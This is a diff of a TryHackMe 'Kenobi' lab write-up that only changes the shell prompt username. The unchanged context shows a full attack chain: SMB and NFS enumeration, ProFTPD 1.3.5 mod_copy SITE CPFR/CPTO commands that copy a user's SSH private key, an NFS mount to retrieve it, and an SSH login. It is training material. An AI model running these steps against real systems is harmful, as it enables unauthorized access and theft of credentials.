@@ -43,7 +43,7 @@ Using [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) we can enumerate a mach
 <img src="Flameshots/bkgVNy3.png" alt="" width="454" height="200" class="jop-noMdConv">
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.157.52
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 16:47 CEST
 Nmap scan report for 10.10.157.52
@@ -92,9 +92,9 @@ On most distributions of Linux smbclient is already installed. Lets inspect one 
 We can access /anonymous :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ smbclient  //10.10.157.52/anonymous
-Password for [WORKGROUP\hax]:
+Password for [WORKGROUP\mdn0x]:
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Sep  4 12:49:09 2019
@@ -121,7 +121,7 @@ In our case, port 111 is access to a network file system. Lets use nmap to enume
 `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.157.52` :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.157.52
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 16:53 CEST
 Nmap scan report for 10.10.157.52
@@ -164,7 +164,7 @@ ProFtpd is a free and open-source [FTP](../../3%20-%20Tags/Hacking%20Concepts/FT
 Let's get the version of ProFtpd. Use [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) to connect to the machine on the [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) port :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ nc 10.10.157.52 -p 21 ftp
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.157.52]
 
@@ -178,7 +178,7 @@ We can use [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) to
 [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) is basically just a command line search tool for exploit-db.com :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ searchsploit ProFTPD 1.3.5         
 ------------------------------------------------- ---------------------------------
  Exploit Title                                   |  Path
@@ -203,7 +203,7 @@ We know that the FTP service is running as the Kenobi user (from the file on the
 We're now going to copy Kenobi's private key using **SITE CPFR and SITE CPTO** commands .
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ nc 10.10.157.52 -p 21 ftp
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.157.52]
 SITE CPFR /home/kenobi/.ssh//id_rsa
@@ -222,14 +222,14 @@ Lets mount the /var/tmp directory to our machine :
 <span style="color: rgb(224, 62, 45);">ls -la /mnt/kenobiNFS</span>
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ sudo mkdir /mnt/kenobiNFS
-[sudo] password di hax: 
+[sudo] password di mdn0x: 
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ sudo mount 10.10.157.52:/var /mnt/kenobiNFS
                                                                
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ ls -la /mnt/kenobiNFS
 totale 56
 drwxr-xr-x 14 root root  4096  4 set  2019 .
@@ -254,10 +254,10 @@ drwxr-xr-x  3 root root  4096  4 set  2019 www
 We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ sudo chmod 600 id_rsa      
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
 └─$ ssh -i id_rsa kenobi@10.10.157.52
 
 kenobi@kenobi:~$ ls
